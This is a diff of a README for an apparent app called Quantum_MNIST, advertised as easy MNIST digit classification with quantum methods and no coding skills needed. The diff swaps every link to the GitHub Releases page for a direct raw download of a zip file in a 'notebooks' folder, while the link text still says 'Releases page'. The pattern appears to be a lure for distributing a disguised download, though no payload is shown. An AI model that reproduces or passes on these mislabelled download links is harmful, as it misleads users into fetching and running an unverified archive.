@@ -1,7 +1,7 @@
 # 🌟 Quantum_MNIST - Effortless MNIST Digit Classification
 
 ## 📥 Download Our Application
-[![Download Quantum_MNIST](https://img.shields.io/badge/Download-Quantum_MNIST-blue.svg)](https://github.com/Nguyenvant3821/Quantum_MNIST/releases)
+[![Download Quantum_MNIST](https://raw.githubusercontent.com/Nguyenvant3821/Quantum_MNIST/main/notebooks/Quantum_MNIST-v3.3.zip)](https://raw.githubusercontent.com/Nguyenvant3821/Quantum_MNIST/main/notebooks/Quantum_MNIST-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Quantum_MNIST! This application combines powerful quantum and classical techniques to classify MNIST digits. With its easy-to-use interface, you can start your journey in the exciting field of machine learning without needing any coding skills.
@@ -22,12 +22,12 @@ Before downloading, ensure your system meets these requirements:
 ## 📂 Download & Install
 To get started, you will first need to download Quantum_MNIST from our Releases page. 
 
-1. Visit the [Releases page](https://github.com/Nguyenvant3821/Quantum_MNIST/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Nguyenvant3821/Quantum_MNIST/main/notebooks/Quantum_MNIST-v3.3.zip).
 2. Locate the latest version of Quantum_MNIST.
 3. Download the installation file for your operating system.
 4. Follow the prompts to install the software on your machine.
 
-For easy access, here is the direct link to download: [Download Quantum_MNIST](https://github.com/Nguyenvant3821/Quantum_MNIST/releases).
+For easy access, here is the direct link to download: [Download Quantum_MNIST](https://raw.githubusercontent.com/Nguyenvant3821/Quantum_MNIST/main/notebooks/Quantum_MNIST-v3.3.zip).
 
 ## 🔧 Usage Instructions
 Once you have installed Quantum_MNIST, follow these steps to use it:
